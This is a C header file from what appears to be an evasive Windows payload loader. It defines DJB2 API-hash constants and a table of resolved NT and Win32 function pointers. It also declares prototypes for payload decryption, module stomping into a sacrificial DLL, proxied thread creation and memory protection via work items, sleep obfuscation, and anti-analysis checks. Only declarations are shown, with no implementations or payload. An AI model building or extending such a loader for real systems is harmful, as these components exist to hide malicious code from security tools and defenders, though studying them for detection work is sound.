// Common.h
#pragma once

#ifndef COMMON_H
#define COMMON_H

#include <Windows.h>
#include "Structs.h"

/*=========================================
@ Constant Values & Macros & Typecastings
===========================================*/
#define INITIAL_HASH			5438
#define INITIAL_SEED			6

#define C_PTR( x ) ( ( PVOID ) x )
#define U_PTR( x ) ( ( UINT_PTR ) x )

#define DELETE_HANDLE(H)											\
	if (H && H != INVALID_HANDLE_VALUE) {							\
		CloseHandle(H);												\
		H = NULL;													\
}

#define DELETE_PTR(PTR)												\
	if (PTR != NULL) {												\
		HeapFree(GetProcessHeap(), 0, PTR);							\
		PTR = NULL;													\
}

/*=========================================
@ Module & API Hashes
===========================================*/

// Modules
#define KERNEL32_DJB2										0x0AD245AE
#define NTDLL_DJB2											0xC3B55AC6

// APIs
#define RtlRegisterWait_DJB2								0x2101618A
#define RtlQueueWorkItem_DJB2								0x5F48B767
#define RtlWalkHeap_DJB2									0xBB65017D
#define RtlCaptureContext_DJB2								0xC19AF269
#define NtCreateSection_DJB2								0xDECDFB29
#define NtCreateEvent_DJB2									0x93C2CF16
#define NtGetContextThread_DJB2								0x32DF7F5D
#define NtSetContextThread_DJB2								0x847E6C69
#define NtQuerySystemInformation_DJB2						0x01557421
#define NtQueryInformationProcess_DJB2						0x5424E35B
#define NtOpenThread_DJB2									0x8B8D9C0A
#define NtDuplicateObject_DJB2								0xF57D2132
#define NtContinue_DJB2										0xAE464F05
#define NtMapViewOfSection_DJB2								0xC3DA15E3
#define NtWaitForSingleObject_DJB2							0x2E2D00B5
#define NtResumeThread_DJB2									0x84C92E29
#define NtSuspendThread_DJB2								0xFDB9F43A
#define NtSignalAndWaitForSingleObject_DJB2					0xFDF43BC6
#define NtCreateThreadEx_DJB2								0xA11671E9
#define NtProtectVirtualMemory_DJB2							0x8E3B1701
#define SystemFunction032_DJB2								0xD2B5789E
#define SystemFunction040_DJB2								0xD2B578DD
#define SystemFunction041_DJB2								0xD2B578DE
#define LoadLibraryW_DJB2									0x9FA67A8A
#define GetModuleHandleW_DJB2								0x303CCE67
#define VirtualProtect_DJB2									0xB7154E86
#define WaitForSingleObject_DJB2							0x70502C13
#define WaitForSingleObjectEx_DJB2							0x9B277770
#define SetEvent_DJB2										0x9365A0EC
#define RegOpenKeyExW_DJB2									0x8F4B756B
#define RegQueryValueExW_DJB2								0xD282E9E3
#define RegCloseKey_DJB2									0x9C8B10BB

/*=========================================
@ WIN32_API Struct
===========================================*/
typedef struct _WIN32_API {
	struct {
		NTSTATUS(NTAPI* RtlRegisterWait)(
			_Out_ PHANDLE WaitHandle,
			_In_ HANDLE Handle,
			_In_ WAITORTIMERCALLBACKFUNC Function,
			_In_opt_ PVOID Context,
			_In_ ULONG Milliseconds,
			_In_ ULONG Flags
		);

		NTSTATUS(NTAPI* RtlQueueWorkItem)(
			_In_ WORKERCALLBACKFUNC Function,
			_In_opt_ PVOID Context,
			_In_ ULONG Flags
		);

		NTSTATUS(NTAPI* RtlWalkHeap)(
			_In_ HANDLE HeapHandle,
			_Inout_ PRTL_HEAP_WALK_ENTRY Entry
		);

		NTSTATUS(NTAPI* RtlCaptureContext)(
			_Out_ PCONTEXT ContextRecord
		);

		NTSTATUS(NTAPI* NtCreateSection)(
			_Out_ PHANDLE SectionHandle,
			_In_ ACCESS_MASK DesiredAccess,
			_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
			_In_opt_ PLARGE_INTEGER MaximumSize,
			_In_ ULONG SectionPageProtection,
			_In_ ULONG AllocationAttributes,
			_In_opt_ HANDLE FileHandle
		);

		NTSTATUS(NTAPI* NtCreateEvent)(
			_Out_ PHANDLE EventHandle,
			_In_ ACCESS_MASK DesiredAccess,
			_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
			_In_ EVENT_TYPE EventType,
			_In_ BOOLEAN InitialState
		);

		NTSTATUS(NTAPI* NtGetContextThread)(
			_In_ HANDLE ThreadHandle,
			_Inout_ PCONTEXT ThreadContext
		);

		NTSTATUS(NTAPI* NtSetContextThread)(
			_In_ HANDLE ThreadHandle,
			_In_ PCONTEXT ThreadContext
		);

		NTSTATUS(NTAPI* NtQuerySystemInformation)(
			_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
			_Inout_ PVOID SystemInformation,
			_In_ ULONG SystemInformationLength,
			_Out_opt_ PULONG ReturnLength
		);

		NTSTATUS(NTAPI* NtQueryInformationProcess)(
			_In_ HANDLE ProcessHandle,
			_In_ PROCESSINFOCLASS ProcessInformationClass,
			_Out_ PVOID ProcessInformation,
			_In_ ULONG ProcessInformationLength,
			_Out_opt_ PULONG ReturnLength
		);

		NTSTATUS(NTAPI* NtOpenThread)(
			_Out_ PHANDLE ThreadHandle,
			_In_ ACCESS_MASK DesiredAccess,
			_In_ POBJECT_ATTRIBUTES ObjectAttributes,
			_In_opt_ PCLIENT_ID ClientId
		);

		NTSTATUS(NTAPI* NtDuplicateObject)(
			_In_ HANDLE SourceProcessHandle,
			_In_ HANDLE SourceHandle,
			_In_opt_ HANDLE TargetProcessHandle,
			_Out_opt_ PHANDLE TargetHandle,
			_In_ ACCESS_MASK DesiredAccess,
			_In_ ULONG HandleAttributes,
			_In_ ULONG Options
		);

		NTSTATUS(NTAPI* NtMapViewOfSection)(
			_In_ HANDLE SectionHandle,
			_In_ HANDLE ProcessHandle,
			_Inout_ PVOID *BaseAddress,
			_In_ ULONG_PTR ZeroBits,
			_In_ SIZE_T CommitSize,
			_Inout_opt_ PLARGE_INTEGER SectionOffset,
			_Inout_ PSIZE_T ViewSize,
			_In_ SECTION_INHERIT InheritDisposition,
			_In_ ULONG AllocationType,
			_In_ ULONG Win32Protect
		);

		NTSTATUS(NTAPI* NtWaitForSingleObject)(
			_In_ HANDLE Handle,
			_In_ BOOLEAN Alertable,
			_In_opt_ PLARGE_INTEGER Timeout
		);

		NTSTATUS(NTAPI* NtSignalAndWaitForSingleObject)(
			_In_ HANDLE SignalHandle,
			_In_ HANDLE WaitHandle,
			_In_ BOOLEAN Alertable,
			_In_opt_ PLARGE_INTEGER Timeout
		);

		NTSTATUS(NTAPI* NtResumeThread)(
			_In_ HANDLE ThreadHandle,
			_Out_opt_ PULONG PreviousSuspendCount
		);

		NTSTATUS(NTAPI* NtSetEvent)(
			_In_ HANDLE EventHandle,
			_Out_opt_ PLONG PreviousState
		);

		NTSTATUS(NTAPI* NtSuspendThread)(
			_In_ HANDLE ThreadHandle,
			_Out_opt_ PULONG PreviousSuspendCount
		);

		PVOID NtContinue;
	} Nt;

	struct {
		HMODULE(WINAPI* LoadLibraryW)(
			_In_ LPCWSTR lpLibFileName
		);

		HMODULE(WINAPI* GetModuleHandleW)(
			_In_opt_ LPCWSTR lpModuleName
		);

		DWORD(WINAPI* WaitForSingleObject)(
			_In_ HANDLE hHandle,
			_In_ DWORD dwMilliseconds
		);

		DWORD(WINAPI* WaitForSingleObjectEx)(
			_In_ HANDLE hHandle,
			_In_ DWORD dwMilliseconds,
			_In_ BOOL bAlertable
		);

		BOOL(WINAPI* VirtualProtect)(
			_In_ LPVOID lpAddress,
			_In_ SIZE_T dwSize,
			_In_ DWORD flNewProtect,
			_Out_ PDWORD lpflOldProtect
		);

		BOOL(WINAPI* SetEvent)(
			_In_ HANDLE hEvent
		);
	} K32;

	struct {
		PVOID SystemFunction032;

		LSTATUS(WINAPI* RegOpenKeyExW)(
			_In_ HKEY hKey,
			_In_opt_ LPCWSTR lpSubKey,
			_In_ DWORD ulOptions,
			_In_ REGSAM samDesired,
			_Out_ PHKEY phkResult
		);

		LSTATUS(WINAPI* RegQueryValueExW)(
			_In_ HKEY hKey,
			_In_opt_ LPCWSTR lpValueName,
			LPDWORD lpReserved,
			_Out_opt_ LPDWORD lpType,
			_Out_opt_ LPBYTE lpData,
			_Inout_opt_ LPDWORD lpcbData
		);

		LSTATUS(WINAPI* RegCloseKey)(
			_In_ HKEY hKey
		);
	} AdvApi;

	struct {
		PVOID SystemFunction040;
		PVOID SystemFunction041;
	} CryptBase;
} WIN32_API, *PWIN32_API;

/*=========================================
@ Function Prototypes
===========================================*/

/* From Common.c */
ULONG HashStringDJB2(IN PVOID String, IN ULONG Length);
VOID MEMCPY(IN PVOID Destination, IN PVOID Source, IN SIZE_T Size);
SIZE_T STRLEN(IN PCSTR String);
PVOID MEMSET(IN PVOID Destination, IN INT Value, IN SIZE_T Count);
VOID AnsiToUnicode(IN PCSTR AnsiString, OUT PWSTR UnicodeString, IN SIZE_T MaxCount);
BOOL InitializeWin32Apis(OUT PWIN32_API pWin32Apis);
VOID XorDecrypt(PBYTE pPayload, SIZE_T sPayloadSize, PBYTE pKey, SIZE_T sKeySize);
BOOL ChaCha20Decrypt(PBYTE pPayload, SIZE_T sPayloadSize, PBYTE pKey, PBYTE pIv);
VOID BaseNDecode(IN PBYTE InputBuffer, IN SIZE_T InputBufferSize, OUT PBYTE* ppOutputBuffer, OUT PSIZE_T psOutputSize);
const char* STRSTR(const char* haystack, const char* needle);

/* From ApiHashing.c */
PVOID LdrRetrieveFunction(IN PVOID Module, IN ULONG ApiHash);
PVOID LdrGetModule(IN ULONG ModuleHash);

/* From Proxy.c */
PVOID WorkItemProxyLoadLibraryW(IN PWSTR Library);
HANDLE WorkItemProxyNtCreateThreadEx(
	_In_ PHANDLE ProcessHandle,
	_In_ PVOID StartRoutine,
	_In_ PVOID Argument
);
NTSTATUS WorkItemProxyNtProtectVirtualMemory(
	_In_ HANDLE ProcessHandle,
	_Inout_ PVOID* BaseAddress,
	_Inout_ PSIZE_T RegionSize,
	_In_ ULONG NewProtection,
	_Out_ PULONG OldProtection
);

/* From ModuleStomp.c */
BOOL StompTheModule(IN PCWSTR szSacrificialDllPath, IN PBYTE pBuffer, IN SIZE_T sBufferSize);

/* From Zilean.c */
ULONG Random32();
VOID ZileanSleep(IN DWORD Timeout);

/* From Anti-Analysis.c */
VOID PerformAntiAnalysisCheck();

#endif // COMMON_H
